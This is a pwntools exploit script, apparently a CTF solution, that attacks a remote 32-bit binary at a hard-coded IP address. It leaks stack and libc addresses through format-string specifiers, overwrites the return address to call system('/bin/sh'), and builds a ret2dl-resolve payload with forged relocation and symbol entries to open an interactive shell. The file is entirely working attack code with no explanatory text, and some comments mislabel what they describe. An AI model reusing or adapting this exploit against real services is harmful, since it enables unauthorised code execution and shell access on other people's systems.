from pwn import *
context.log_level ='DEBUG'
p = remote('47.99.176.38',5210)
elf = ELF('./main')
p.recvuntil("Input your name:")
p.send("%17$p")
ret_esp = int(p.recv(10),16)
PI='\x00'*0x24 + p32(ret_esp +0x70 + 4)
p.send(PI)
p.recvuntil("Input your name:")
p.send('%25$p')
libc_base=int(p.recv(10),16)-0x1E2880
one=libc_base+0x3AC69
system = libc_base +  0x03ADA0
binsh = libc_base +  0x15BA0B
offset = ret_esp + 0x40 + 4 + 0x30
log.info('Ret:\tOFF:\t\n' + hex(ret_esp) + '\t' + hex(offset))
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('Input your info:')
PII = p32(system) + p32(0) + p32(binsh)
PII = PII.ljust(0x24,'\x00')
PII +=p32(offset)
p.send(PII)
p.recvuntil("Input your name:")
p.send('FMYY\x00')
p.recvuntil('Input your info:')
leave_ret = 0x08048418
pop_rbp_ret = 0x080485BB
read_plt = elf.got['read']
PIII =  p32(read_plt) + p32(0) + p32(elf.bss()+0x200) + p32(0x200)
PIII += p32(pop_rbp_ret) + p32(elf.bss() +0x200 -4) + p32(leave_ret) 
PIII += p32(0)*2
PIII += p32(ret_esp + 0x40 +4)
#-----------
base_stage = elf.bss()+0x200

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = 0x8048314#elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

## Making fake write symbol
fake_sym_addr = base_stage + 24
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)	# Since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10	# Calculate the dynsym index of write
## Plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_read_sym = flat([st_name, 0, 0, 0x12])

index_offset = base_stage + 16 - rel_plt 
read_got = elf.got['read']
r_info = (index_dynsym << 8) | 0x7 		# Create the fake r_info
fake_read_reloc = flat([read_got, r_info])

payload  = p32(plt0)
payload += p32(index_offset)
payload += 'UUUU'
payload += p32(base_stage + 80) # binsh
payload += fake_read_reloc
payload += 'U'*align
payload += fake_read_sym
payload += 'system\x00'
payload += 'U' * (80 -len(payload))
payload += '/bin/sh\x00'
payload += 'U'*(100 - len(payload))

p.send(PIII)
p.send(payload)
p.interactive()

